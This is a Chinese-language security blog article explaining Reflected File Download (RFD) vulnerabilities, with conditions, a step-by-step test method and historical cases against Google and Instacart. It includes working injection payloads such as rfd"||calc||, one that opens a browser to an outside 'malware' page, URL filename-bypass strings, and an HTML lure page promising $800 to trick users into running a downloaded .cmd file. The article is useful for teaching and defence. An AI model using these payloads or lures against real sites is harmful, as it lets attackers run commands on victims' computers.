#  RFD漏洞原理浅析   
Heptagram  七芒星实验室   2024-04-25 23:44  
  
#### 基本介绍  
  
RFD(Reflected File Download)即反射型文件下载漏洞，2014年在BlackHat中被提出，该漏洞在原理上类似XSS，在危害上类似DDE，攻击者可以通过一个URL地址使用户下载一个恶意文件，从而危害用户的终端PC，不过这个漏洞很罕见，大多数公司会认为它是一个需要结合社工的低危漏洞，但微软，雅虎，eBay，PayPal和其他许多公司认为这是一个中危漏洞  
#### 漏洞原理  
  
下面从一个实例理解RDF漏洞，我们通过Google搜索的返回包json格式大致如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmEOqfROAn3GsbkOPkTWaOOpAsBtdibibachRTY3FR3ic0Kwa8A1CUMMZu2ZeQERCjdWVBott0siaOmeA/640?wx_fmt=png&from=appmsg "")  
  
由此可见，我们的输入在返回包处反射输出，  
我们添加双引号后输出结果变更如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmEOqfROAn3GsbkOPkTWaOOUCbwEwPttGWo1JH0Picwjcf2Np5iaTbEXwrs4IuzChIVwj86VA4Xiaf7w/640?wx_fmt=png&from=appmsg "")  
  
可以看到输入的双引号被转义了，之后我们构造以下的payload：  
```
rfd"||calc||
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmEOqfROAn3GsbkOPkTWaOO02C6WW2lYhLK1qErgHf2icAPT6Y622LMaNbXxSAcrN4mJK7934gcPEg/640?wx_fmt=png&from=appmsg "")  
  
到这里仍没什么问题，之后我们尝试在命令行里运行这个回显内容，首先我们再这里仅在命令行下运行前半部分内容，此时会发现这里会报错误信息  
```
{"results":["q", "rfd\"||calc||","I love rfd"]}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmEOqfROAn3GsbkOPkTWaOOe3wvlhAjgoppw2MJWQXw2TUtUMNj6z6ia0DxNuIwicSJyY6bibXjuMnTw/640?wx_fmt=png&from=appmsg "")  
  
故而证明前半部分为false：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmEOqfROAn3GsbkOPkTWaOO9esdHkBZdfIelPAsYGS5uGIpTdP3sCXHicFAWpIr7RwUOQQ7bWwiaywg/640?wx_fmt=png&from=appmsg "")  
  
之后我们运行一下内容会直接弹出calc  
```
{"results":["q", "rfd\"||calc||","I love rfd"]
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmEOqfROAn3GsbkOPkTWaOOC18XXtAUUGwTC3CawI66m6qD39evIxicaicqhVmwMMjHSAhxX5VjgPIw/640?wx_fmt=png&from=appmsg "")  
  
发现在显示"文件名或目录不存在"的同时会执行我们的管道符后的命令calc并弹出计算器，整个解析过程实际为：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmEOqfROAn3GsbkOPkTWaOOkOBG1WOmsNVjP1WdrRHMzFdgJEYdYDdvbVmoOicy8zVDqD25ecXZbFg/640?wx_fmt=png&from=appmsg "")  
  
下面我们看一下整个流程，首先用户向服务器端发送请求，此时在回显数据报中我们传入的参数数据原样输出：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmEOqfROAn3GsbkOPkTWaOOJ33Y6tV3xMlHJdRtX2ggcXpJ9R3PgGocHnNLS2TXPiceiaWrV3LCibd5Q/640?wx_fmt=png&from=appmsg "")  
  
之后我们改造URL通过利用和  
DDE相似的攻击方法让回显内容作为一个bat文件下载，这一点可以通过分号(;)或结合社工的方式来实现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmEOqfROAn3GsbkOPkTWaOOwmoDIhPVuB5DYyJFL30A8p0OfPjYV8W94RYADdw7D38MeN0k7Z5dPA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmEOqfROAn3GsbkOPkTWaOOXFX4JCBBJegB1uficLn068BfNZH4jhGISM32OzRJwcJfNVfDTpviamicQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmEOqfROAn3GsbkOPkTWaOOq2QZxp1RWSicK4ibSsn0dShSAT7ZmVREDSop3roDYqDvwGOniaSSqvPvA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmEOqfROAn3GsbkOPkTWaOOITzLvFpmNy7CAq5gPyVV15InSvCxNzy15PVYlWFrGcjZu4uAgOTKeg/640?wx_fmt=png&from=appmsg "")  
  
备注：URL中分号;是个保留字符，类似连接符，现已废除  
#### 漏洞挖掘  
  
根据漏洞触发的三个条件挖掘漏洞：  
- 输入反射：用户输入被"反射"到响应内容  
  
- 文件名可控：URL允许接受用户的其他输入，攻击者将其用于把文件扩展名设置为可执行扩展名  
  
- 诱导下载操作：响应被作为文件里内容进行下载，通过控制Content-Type或者在VPS上创建一个HTML文件并设置download属性，诱导点击下载  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmEOqfROAn3GsbkOPkTWaOOFpnrpBCZBp0UTnc1l2ibNc6MkfQOoon0fkynjzibpfKqfceryliaPuzBQ/640?wx_fmt=png&from=appmsg "")  
  
简易测试示例：  
  
Step 1：验证JSON/JSONP API的响应并检查是否得到了任何用户输入，从下面的示例中您可以看到first_name，last_name和ph反射在JSON响应中  
```
#请求示例
https://some.website.com/api/v1.0/get_user_profile

#响应示例：
{
"data": {
        "id": "1239985",
        "domain": "website.com",
        "ph": "6456787984",
        "first_name": "DemoTest",
        "last_name": "LastRFD",
        "version": "5",
        }
}
```  
  
  
Step 2：通过输入RFD有效负载rfd"||calc||到first_name和last_name字段，验证JSON/JSONP响应(如果它像rfd"||calc|| 一样反射回来，那么就有RFD的可能性)，  
要完全验证它需要将响应复制并保存为filename.bat，使用cmd提示打开它，可以看到窗口calc弹出了  
```
{
    "data": {
        "id": "1239985",
        "domain": "website.com",
        "ph": "6456787984",
        "first_name": "rfd\"||calc||",
        "last_name": "rfd\"||calc||",
        "version": "5",
     }
}
```  
  
Step 3：构造文件名  
  
如果我们在IE 11中命中JSON/JSONP API URL，我们可以看到响应将以somefileName.json的形式下载，文件名主要取决于http Content-Disposition标头和URL，而要利用此漏洞，我们需能够将文件格式更改为.cmd，.bat或.exe才能执行  
  
例如：Content-Disposition: userprofile.json，此时的文件将以Content-Disposition标头中提到的相同名称下载，因此我们无法利用它，我们需要转到下一个可能性，例如:没有Content-Disposition标头的响应，如果Content-Disposition响应标头中没有返回文件名属性，浏览器将被迫根据URL确定下载文件的名称，例如：https://some.website.com/api/v1.0/get_user_profile，此时我们可以使用以下有效负载来绕过此文件名：  
```
get_user_profile.bat
get_user_profile;setup.bat
get_user_profile/setup.bat
get_user_profile;/setup.bat
get_user_profile;/setup.bat;
```  
  
Step 4：下载文件操作，下面给出一个  
HTML模板，此时如果用户打开html页面，单击链接，文件将下载为setup.cmd  
```
<! DOCTYPE html>
<html>
<body>
  <p>Click the Image and open the file: You will be rewarded with $800<p>
  <a href="https://some.website.com/api/v1.0/get_user_profile/setup.cmd?" download>
  <img border="0" src="https://some.website.com/api/v1.0/get_user_profile/setup.cmd?" alt="8000 Dollars" width="104" height="142"></a>
</body>
</html>
```  
  
以上整个利用路径为：  
```
用户点击URL链接->下载文件->打开文件->恶意命令执行
```  
#### 简易案例  
##### Google  
  
这是Oren Hafif在google利用的例子，在facebook中插入的一个google超链接，如下形式内容：  
```
https://www.google.com/s;/Glasslnstaller.bat;/Glasslnstaller.bat?gs_ri=psy-ab&q=%22%7c%7c%74….
```  
  
点击后会下载一个bat文件到本地，下载后直接运行效果如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmEOqfROAn3GsbkOPkTWaOOKOeJWMZ9ibtjXMlGbJc2C6husSmeMsk9nSQSicqdcDicsFvX9VEtMY21A/640?wx_fmt=png&from=appmsg "")  
  
在该恶意bat文件中我们可以写入恶意命令，例如：shutdown等之后使其执行，在这个构造过程中，我们先用了一个双引号闭合掉了前面的不可控的双引号，然后利用||符号(命令行中||表示逻辑"或")保证命令成功执行  
##### Instacart  
  
请求https://www.instacart.com/api/v2/searches?cart_id=3471936&term=rfd&page=1，之后发现term参数回显：  
```
{"meta":{"code":200,"source":"search_service","cluster":null},"data":{"term":"rfd","inventory_area_id":617,"items":[],"total_results":0,"aisles":[],"warehouses":[],"search_strategies":[],"tracking":{},"product_type_filter":false,"has_deals":false,"search_id":141585110},"pagination":{"total":0,"page":1,"per_page":50}}
```  
  
之后将term参数修改为以下payload：  
```
"||start chrome davidsopas.com/poc/malware.htm||
```  
  
创建html文件诱导下载：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmEOqfROAn3GsbkOPkTWaOO00GibVwRDzhp3SsCQTTibJ3R2PNKZ6RA1N1gZGztGDuZtToCmYQ2EaDA/640?wx_fmt=png&from=appmsg "")  
#### 修复措施  
- 使用CSRF令牌  
  
- 为所有API实施安全标头  
  
- 使用Content-Disposition标题强制文件名  
  
#### 参考链接  
  
https://www.blackhat.com/docs/eu-14/materials/eu-14-Hafif-Reflected-File-Download-A-New-Web-Attack-Vector.pdf  
  
  
  
